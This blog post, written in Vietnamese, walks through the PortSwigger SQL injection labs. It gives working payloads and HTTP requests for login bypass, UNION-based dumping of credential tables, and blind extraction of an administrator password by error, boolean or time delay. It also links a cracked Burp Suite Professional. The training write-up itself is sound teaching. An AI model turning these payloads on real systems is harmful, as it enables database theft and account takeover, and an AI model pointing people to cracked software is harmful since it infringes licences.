---
title: "[PortSwigger Lab] - Sql Injection"
description: The first post
date: 2025-05-21 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/sql_injection.png
    alt: Sql Injection
---

## Introduction
---
### What is SQL Injection(SQLi)? 
SQL Injection (SQLi) là một dạng tấn công bảo mật trong đó kẻ tấn công chèn (inject) mã SQL độc hại vào một truy vấn cơ sở dữ liệu thông qua các đầu vào không được kiểm soát (chẳng hạn như form đăng nhập, URL, cookie...). Mục tiêu là can thiệp vào truy vấn SQL gốc mà ứng dụng web thực hiện, từ đó có thể:
- Xem dữ liệu mà bình thường không được phép truy cập (vd: thông tin người dùng, mật khẩu đã mã hóa).
- Thay đổi dữ liệu (vd: cập nhật thông tin người dùng, xóa dữ liệu).
- Thực thi các lệnh quản trị cơ sở dữ liệu (vd: DROP TABLE).
- Trong trường hợp nặng hơn, có thể chiếm quyền điều khiển server.

### Type of SQL Injection(SQLi)?

| Type                  | Description                                                                                   |
|-----------------------|-----------------------------------------------------------------------------------------------|
| **Classic (In-band)** | Kẻ tấn công thấy ngay kết quả của truy vấn bị chèn SQL, thường dùng `' OR '1'='1` để bypass.  |
| **Tautology-based**   | Chèn biểu thức luôn đúng vào câu lệnh WHERE để qua mặt kiểm tra xác thực. Ví dụ: `admin' --` |
| **Union-based**       | Dùng `UNION` để nối thêm kết quả từ truy vấn khác, thường để đọc dữ liệu bảng nhạy cảm.       |
| **Boolean-based Blind** | Dựa vào phản hồi đúng/sai từ server để suy đoán thông tin. Ví dụ: `' AND 1=1 --`            |
| **Time-based Blind**  | Sử dụng hàm gây trễ như `SLEEP()` để xác định kết quả thông qua thời gian phản hồi.          |
| **Error-based**       | Khai thác lỗi trả về để lấy thông tin cấu trúc cơ sở dữ liệu.                                 |
| **Out-of-Band (OOB)** | Không nhận phản hồi trực tiếp, thay vào đó gửi dữ liệu ra ngoài (DNS, HTTP).                 |
| **Stacked Queries**   | Chạy nhiều truy vấn trong một lần, ví dụ: `1'; DROP TABLE users --`                           |
| **Second-order**      | Dữ liệu độc hại được lưu vào DB và thực thi sau ở một vị trí khác trong ứng dụng.            |


## Solve SQL Injection Labs
[Cheat Sheat](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[Burpsuite Professional Crack](https://github.com/xiv3r/Burpsuite-Professional)

---
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa phát hành.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Payload:
```
' OR 1=1 --
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

Request:

```http
GET /filter?category='+OR+1%3d1+-- HTTP/2
Host: 0aa400cc04b07ef3818389f900dd00df.web-security-academy.net
```

### Lab: SQL injection vulnerability allowing login bypass
> Mục tiêu: Thực hiện một cuộc tấn công tiêm SQL đăng nhập vào ứng dụng với tư cách là `administrator`.

Phòng thí nghiệm này chứa lỗ hổng tiêm SQL trong chức năng đăng nhập, ứng dụng sẽ thực hiện truy vấn SQL như sau:

```sql
SELECT * FROM users WHERE username = 'usenname' AND password = 'password'
```

Payload:
```
administrator'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'password'
```

Request:

```http
POST /login HTTP/2
Host: 0aca001104f9e33981f77a9d001f003c.web-security-academy.net

csrf=FeKN7j0LMwFrA9s7ph9bXzk0ZcoxiAIZ&username=administrator%27+--&password=abc
```

### Lab: SQL injection attack, querying the database type and version on Oracle
> Mục tiêu: Hiển thị version của `database`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Specify the number of columns
Trên cơ sở dữ liệu **Oracle**, mỗi câu lệnh **SELECT** bắt buộc phải có mệnh đề **FROM**, tức là phải lấy dữ liệu từ một bảng nào đó. Điều này khác với một số hệ quản trị cơ sở dữ liệu khác như **MySQL**, nơi bạn có thể viết:
```sql
SELECT 'abc';
```

Trong **Oracle**, cần sử dụng bảng dual để truy vấn không bị lỗi.

Payload:
```
' UNION SELECT 'abc', 'def' from dual--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def' from dual--' ...
```

Nếu không trả về lỗi tức **SELECT** đầu tiên chỉ có 2 trường field1 và field2. Vì khi sử dụng **UNION** thì số trường của nó phải tương ứng với số trường của **SELECT** đầu tiên.

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',+'def'+FROM+dual-- HTTP/2
Host: 0aa100c804bdaaca80461cd000ac0034.web-security-academy.net
```

#### Determine the Database Version
Payload:
```
' UNION SELECT 'abc', banner from v$version--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT 'abc', banner from v$version--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',+banner+FROM+v$version-- HTTP/2
Host: 0aa100c804bdaaca80461cd000ac0034.web-security-academy.net
```

Result:
![Oracle DB Version](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/query_oracle_version.png)


### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
> Mục tiêu: Hiển thị version của `database`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Specify the number of columns
Cũng như lab vừa rỗi nhưng **MySQL** và **Microsoft** không cần **FROM** cho **SELECT**, không sử dụng được comment `--` tại lab này, mà phải sử dụng `#`.

Payload:
```
' UNION SELECT 'abc', 'def'#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def'#' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'%23 HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Determine the Database Version
**MySQL** và **Microsoft** sử dụng chung lệnh `SELECT @@version` để lấy **Version**.

Payload:
```sql
' UNION SELECT 'abc', @@version#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 fieldn FROM products WHERE category = '' UNION SELECT 'abc', @@version#' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc',@@version%23 HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

Result:

![MySQL and Microsolf Version](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-21-portswigger-lab-sql-injection/query_msql_microsoft_version.png)

### Lab: SQL injection attack, listing the database contents on non-Oracle databases
> Mục tiêu: Đăng nhập với vai trò `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu chứa một bảng lưu trữ tên người dùng và mật khẩu. Bạn cần xác định tên của bảng này và các cột mà nó chứa, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.

#### Specify the number of columns
Sử dụng tương tự các cách trên ta được số lượng cột trả về là 2

Payload:
```
' UNION SELECT 'abc', 'def'#
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all table name
Xác định tên của bảng chứa `username` và `password`
Payload:
```
' UNION SELECT 'abc', table_name FROM information_schema.tables--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT 'abc', table_name FROM information_schema.tables--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'table_name'+FROM+information_schema.tables-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all collumn name
Cần xác định tên của trường chứa `username` và `password` để để lấy thông tin tài khoản `administrator`.

Payload:
```
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_bmlccj'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_bmlccj'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_bmlccj'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get administrator's password
Payload:
```
' UNION SELECT username_plivox, password_jffxkk FROM users_bmlccj--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT username_plivox, password_jffxkk FROM users_bmlccj--' ...
```

Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.


### Lab: SQL injection attack, listing the database contents on Oracle
> Mục tiêu: Đăng nhập với vai trò `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Thực hiện tương tự bài lab trên nhưng sử dụng các cú pháp của **Oracle**.

#### Specify the number of columns
Tương tự nhưng có FROM dual phía sau, ta xác định được 2 cột trả về.

Payload:
```
' UNION SELECT 'abc', 'def' FROM dual--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = '' UNION SELECT 'abc', 'def' FROM dual--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all table name
Xác định tên của bảng chứa `username` và `password`

Payload:
```
' UNION SELECT NULL, table_name FROM all_tables--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL, table_name FROM all_tables--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'table_name'+FROM+all_tables-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get all collumn name
Cần xác định tên của trường chứa `username` và `password` để để lấy thông tin tài khoản `administrator`.

Payload:
```
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_RNVYLX'--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_RNVYLX'--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name='USERS_RNVYLX'-- HTTP/2
Host: 0a31003a04f410a880ac87d8001a0088.web-security-academy.net
```

#### Get administrator's password
Payload:
```
' UNION SELECT USERNAME_LXRDRN, PASSWORD_ANINSL FROM USERS_RNVYLX--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT USERNAME_LXRDRN, PASSWORD_ANINSL FROM USERS_RNVYLX--' ...
```

Hoàn thành lab bằng cách đăng nhập bằng tài khoản `administrator`.

### Lab: SQL injection UNION attack, determining the number of columns returned by the query
> Mục tiêu: Tìm số lượng cột trả về.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Payload:
```
' UNION SELECT NULL,NULL,NULL--
```

Tăng hoặc giảm **NULL** để có thể tìm được số lượng cột của **select** ban đầu, vì khi sử dụng **UNION** sau **SELECT** phải đảm bảo số trường phải bằng nhau.

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, field3 FROM products WHERE category = '' UNION SELECT NULL,NULL,NULL--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
Host: 0ac500110304e078827f2e7e0016009c.web-security-academy.net
```

Nếu server không trả về lỗi là đã thành công!


### Lab: SQL injection UNION attack, finding a column containing text
> Mục tiêu: Tìm số lượng cột và cột nào chứa dữ liệu dạng string.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

#### Check number of column
Tương tự như cách làm ở trên

#### Check column contain string
Sau khi xác định được số lượng cột, thay đổi từng **NULL** bằng 1 chuỗi để kiểm tra xem trường đó chứa chuỗi không.

Payload:
```
' UNION SELECT NULL,'abc',NULL--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2, field3 FROM products WHERE category = '' UNION SELECT NULL,'abc',NULL--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,'abc',NULL-- HTTP/2
Host: 0aac00f304cd312981790cd700d50010.web-security-academy.net
```

### Lab: SQL injection UNION attack, retrieving data from other tables
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```

Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
Thực hiện một cuộc tấn công **UNION** SQL Injection truy xuất tất cả các `username` và `password` và sử dụng thông tin để đăng nhập với tư cách là `administrator`.

#### Check number of column
Tương tự như cách làm ở trên

#### Check data of **username** and **password** field
Sau khi xác định được số cột, sử dụng **UNION** để hiển thị dât của `username` và `password`. Lấy thông tin đăng nhập của `administrator` và đăng nhập.

Payload:
```
' UNION SELECT username,password FROM users--
```

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT username,password FROM users--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+username,password+FROM+users-- HTTP/2
Host: 0a5000b204d472c880cdd01700d80031.web-security-academy.net
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
```sql
SELECT field1, field2, ..., fieldn FROM products WHERE category = 'category_name' ...
```
Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`.
Thực hiện một cuộc tấn công **UNION** SQL Injection truy xuất tất cả các `username` và `password` và sử dụng thông tin để đăng nhập với tư cách là `administrator`.

#### Check number of column && Check column contain string
Cũng thự hiện tương tự 2 lab trên, nhưng ở đây chỉ có 1 trường chứa kiểu `string`. Vì thế chỉ có thể hiển thị nội dung của 1 trương `username` hoặc `password`.
> Ý tưởng: Gộp `username` và `password` vào chung 1 trường.

Payload:
```
' UNION SELECT NULL,CONCAT(username,||,password) FROM users--
```

Ta sử dụng hàm **CONCAT()** để gộp nội dung các cột lại với nhau. Nối `username` và `password`, dùng `||` để tách biệt nó ra cho dễ quan sát, dữ liệu hiển thị ở dạng `wiener||wiener_password`

Câu truy vấn sẽ được thay thế thành:
```sql
SELECT field1, field2 FROM products WHERE category = '' UNION SELECT NULL,CONCAT(username,||,password) FROM users--' ...
```

Request:

```http
GET /filter?category='+UNION+SELECT+NULL,CONCAT(username,'||',password)+FROM+users-- HTTP/2
Host: 0a1400560347179d818bacde006400a6.web-security-academy.net
```

Lấy thông tin đăng nhập của `administrator` và đăng nhập.

### Lab: Blind SQL injection with conditional responses
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL mù. Ứng dụng sử dụng `cookie` để phân tích và thực hiện truy vấn SQL chứa giá trị của `cookie` đã gửi.
Kết quả của truy vấn SQL không được trả về và không có thông báo lỗi nào được hiển thị. Nhưng ứng dụng bao gồm một tin nhắn `Welcome back!` trong trang nếu truy vấn trả về bất kỳ hàng nào.

Cơ sở dữ liệu chứa một bảng khác được gọi là `users`, với các cột được gọi là `username` và `password`. Bạn cần khai thác lỗ hổng tiêm SQL mù để tìm hiểu mật khẩu của `administrator`.

Cần chọn `request` có `cookie` gửi đến **Repeater**.

#### Check condition
Payload:
```
abc' OR 1=1--
```

Request:

```http
GET / HTTP/2
Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
Cookie: TrackingId=abc' OR 1=1--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
```

Ứng dụng sẽ kiểm tra `TrackingId='abc'` có đúng không, nếu không đúng sẽ kiểm tra điều kiện `1=1` (**luôn đúng**).
Nếu page có `Welcome back!` là chính xác, có thể thay `1=2` để kiểm tra, sẽ không có `Welcome back!` xuất hiện.

> Ý tưởng: Ta đã biết `password` cần tìm là của `user` có `username` là `administrator`, nên chỉ cần xác định độ dài của `password` rồi tìm `password` từ vị trí đầu đến vị trí cuỗi cùng của nó. Ta sử dụng **Burp Intruder** để tự động quá trình tìm `password`.

#### Check administrator's password length
Request:

```http
GET / HTTP/2
Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
```

Điều kiện `TrackingId='abc'` là sai nên truy vấn sau `OR` luôn được thực hiện.
Với truy vấn dưới đây thì nó luôn luôn đúng, nó sẽ trả về `'a'='a'`
```sql
(SELECT 'a' FROM users WHERE username='administrator')='a'
```

Nên ta có thể thêm toán tử  `AND` để kiểm tra độ dài `password` bằng hàm `LENGTH()`

Sử dụng **Burp Intruder** để tự động tìm độ dài `password`

```http
GET / HTTP/2
Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > $1$ )='a'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
```

- `Add` ở vị trí số 1
- **Payload** > **Payload type** > **Numbers**
- **Number range**: From 1 To 20, Step 1
- **Settings** > **Grep-Match**: Clear and Add `Welcome back`
- **Start attack**

Kiểm tra xem vị trí cuối cùng có chữ `Welcome back` thì đó là độ dài của `password`, ở đây tôi tìm được 19.

#### Check administrator's password

Request:

```http
GET / HTTP/2
Host: 0a7f00b9030be72980a6369400ba0004.web-security-academy.net
Cookie: TrackingId=abc' OR (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password, $1$, 1) = '' )='$a$'--; session=B77245LzAYEC6MPPFqWG09RgmmJ34qwi
```

Sử dụng hàm `SUBSTRING()` để lấy kí tự tại vị trí cần lấy: `SUBSTRING(password, position, length)`

- Chọn chế độ `attack` tổ hợp giữa vị trí `1` và `a`: `Cluster bomb attack`
- **Payload** > **Payload position**
    - **1 - 1**: chọn `type` là `Numbers` từ 1 đến 19
    - **2 - a**: chọn `type` là `Brute forcer` với `Min length` và `Max Length` là 1
- Thêm `Grep-Match` như trên
- **Start attack**

Lấy kết quả, nối chúng lại theo đúng vị trí. Đăng nhập với tư cách `administrator`.


### Blind SQL injection with conditional errors
> Mục tiêu: đăng nhập với tư cách `administrator`.

Điều kiện như câu ở trên nhưng ứng dụng không trả về `Welcome back` mà trả về `Internal Server Error`.

#### Check type error
Ở đây không thể sử dụng payload `abc' OR 1=1` để kiểm tra, vì trong trường hợp này **server** chỉ trả về lỗi cú pháp, không trả về lỗi truy vấn. Bạn có thể thử bằng payload `abc' OR 1=2`, thực sự không có lỗi.
Sử dụng payload `abc'` sẽ thấy **server** trả về lỗi, nhưng nếu là `abc''` thì kết thúc lỗi, truy vấn sẽ trở thành như sau:
```sql
SELECT ... FROM cookies WHERE TrackingId='abc'' # abc'
SELECT ... FROM cookies WHERE TrackingId='abc''' # abc''
```

> Ý tưởng khai thác cũng như ở lab trên nhưng sử dụng tín hiệu là `error` trả về thay về `Welcome back`.

#### Check type database
Payload:
```
abc'||(SELECT '' FROM dual)||'
```
Chèn vào câu lệnh SQL có phép nối chuỗi `||`, sử dụng `FROM dual` để biết nó có phải `Oracle` database không, ở đây là `Oracle`.

#### Check users table is exist
Payload:
```
abc'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```
- Nếu không lỗi, có thể bảng users tồn tại.
- ROWNUM = 1: Giới hạn để chỉ lấy 1 dòng (tránh lỗi khi `concat` quá nhiều dòng → `Oracle` sẽ lỗi).

#### Get administrator's password length
Payload:
```
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Sử dụng truy vấn có điều kiện trong Oracle:
- Nếu `(1=1)` thì `SELECT TO_CHAR(1/0)` hoặc `SELECT '' FROM dual`
- Điều kiện `(1=1)` đúng nên sẽ `SELECT TO_CHAR(1/0)`, xuất hiện lỗi chia cho 0 nên **server** xuất ra lỗi.

Payload:
```
xyz'||(SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- Thay `(1=1)` bằng `LENGTH(password) > 1` 
- Thay `dual` bằng `users` vì ta cần tìm dữ liệu trong bảng `users`
- Không cần sử dụng `ROWNUM` vì đã giới hạn `record` bằng `username='administrator'`
- Sử dụng **Burp Intruder** để tự động hóa quá trình tấn công, tăng dần `number` từ 1 tới 30
- Thêm `Internal Server Error` vào `Grep-Match`
- Vị trí cuỗi cùng xuất hiện là độ dài của `password`

#### Get administrator's password
Tương tự như lab trên ta check điều kiện ở từng vị trí của password
Payload:
```
xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Chọn chế độ `Cluster bomb attack` để tấn công tổ hợp
- Vị trí `1 - 1` chọn `Numbers`: From 1 - To password length - Step 1
- Vị trí `1 - a` chọn `Brute forcer`: Min length = Max length = 1
- Thêm `Grep-Match` như trên.
- Start attack
- Lọc kết quả và nối theo đúng thứ tự


### Lab: Visible error-based SQL injection
> Mục tiêu: đăng nhập với tư cách `administrator`.

Điều kiện như 2 câu trên nhưng xuất hiện lỗi có thể thấy được.

#### Check type error
Payload:
```
'
```
Khi thêm payload này, ta thấy lỗi của SQL
```html
Unterminated string literal started at position 36 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Ta sử dụng payload `' OR 1=1--`, lỗi đã mất

> Ý tưởng: giống [Lab: Blind SQL injection with conditional responses](https://waibui.github.io/posts/portswigger-lab-sql-injection/#lab-blind-sql-injection-with-conditional-responses) nhưng sử dụng `error` làm tín hiệu thay cho `Welcome back`.

#### Exploit
Payload:
```
' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```

Sẽ xảy ra lỗi vượt quá số lượng kí tự:

```html
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '' OR (SELECT 'a' FROM users WHERE username='administrator' A'. Expected char
```

> Ý tưởng: Ép kiểu để xảy ra lỗi, quẳng data cần tim ra error.

Payload:
```
' OR 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- Sử dụng `CAST(value AS type)` để ép kiểu
- `username` ở dạng chuỗi (eg: `'administrator'`) nên ép kiểu sang `int` sẽ bị lỗi, làm quẳng lỗi với `username`
- `LIMIT 1` đẻ giới hạn số lượng `row` thành 1 để không bị lỗi khi `merge`

Kết quả:
```html
ERROR: invalid input syntax for type integer: "administrator"
```
Ta thấy được tên `username` là `administrator`

Payload:
```
' OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Lấy `password` ở `row` đầu tiên tương ứng với administrator

Lỗi được hiển thị
```html
ERROR: invalid input syntax for type integer: "iqkju3azwuccb85jbwxx"
```

Request:
```http
GET / HTTP/2
Host: 0a1f00ff0326b398805ac15d005300b5.web-security-academy.net
Cookie: TrackingId=' OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ; session=ALCo58Xt5yYwqhazKher42ZSZN2kbDOn
```


### Lab: Blind SQL injection with time delays
> Mục tiêu: Khai thác lỗ hổng SQL để gây ra độ trễ 10 giây.

Phòng thí nghiệm này chứa lỗ hổng SQL mù mù. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi.
Kết quả của truy vấn SQL không được trả về và ứng dụng không trả lời bất kỳ khác nhau dựa trên việc truy vấn có trả lại bất kỳ hàng nào hay gây ra lỗi hay không. Tuy nhiên, vì truy vấn được thực thi đồng bộ, có thể kích hoạt sự chậm trễ thời gian có điều kiện để suy ra thông tin.

Payload:
```
'||pg_sleep(10)--
```

- Ở đây chưa biết được loại `database` nào nền cần thử tất cả các lệnh `sleep`
- Sử dụng phép nối chuỗi `||` kết hợp với lệnh `pg_sleep(10)` đằng sau
- Kiểu khai thác này dựa trên thời gian phản hồi khi không có `signal` nào khác được trả lại

Request:
```http
GET / HTTP/2
Host: 0a5200a90433971c82418dc800c000e0.web-security-academy.net
Cookie: TrackingId='||pg_sleep(10)-- ; session=u7jmFxowLjpN0iXoBX79LbnQokeND6nF
```

### Lab: Blind SQL injection with time delays and information retrieval
> Mục tiêu: đăng nhập với tư cách `administrator`.

Phòng thí nghiệm này chứa lỗ hổng SQL mù. Ứng dụng sử dụng `cookie` theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của `cookie` đã gửi.

Cơ sở dữ liệu chứa một bảng khác được gọi là users, với các cột được gọi là username và password. Bạn cần khai thác lỗ hổng tiêm SQL mù để tìm hiểu password của `administrator`.

Sử dụng kỹ thuật Time base SQLi để  khai thác.

#### Check database type
Tương tự lab trên ta kiểm tra loại database bằng `payload`:
```
'||pg_sleep(5)--
```

Lấy thời gian phản hồi làm tín hiệu, ta sử dụng payload sau:
```
abc';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```
- Kết hợp với câu lệnh điều kiện để điều khiển tín hiệu sleep
- Thay (1=1) bằng điều kiện cần để lấy thông tin
- Sử dụng `;` để thực hiện câu lệnh tiếp theo

Request:

```http
GET / HTTP/2
Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
Cookie: TrackingId=abc'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
```

#### Check administrator is exist
Payload:
```
abc';SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```
Kiểm tra điều kiện `username='administrator'` trong bảng `users`, nếu có `pg_sleep(5)`, không có `pg_sleep(0)`

Request:
```http
GET / HTTP/2
Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(username%3d'administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
```

#### Get administrator's password length
Payload:
```
abc';SELECT CASE WHEN (LENGTH(password) > $1$) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Request:
```http
GET / HTTP/2
Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(LENGTH(password)+>+$1$)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
```

- Sử dụng **Burp Intruder**
- `Add` tại vị trí 1
- Chọn `Payload type`: `Numbers`
- From 1 - To 30 - Step 1
- Hàng có `response time` > `5s` là độ dài của `password` cần tìm

#### Get administrator's password length
Payload:
```
abc';SELECT CASE WHEN (SUBSTRING(password,$1$,1) = '$a$') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Request:
```http
GET / HTTP/2
Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
```

- Sử dụng **Burp Intruder**
- Chọn chế độ `Cluster bomb attack`
- Vị trí `1 - 1` chọn `Numbers` từ 1 đến độ dài `password` tìm được, step 1
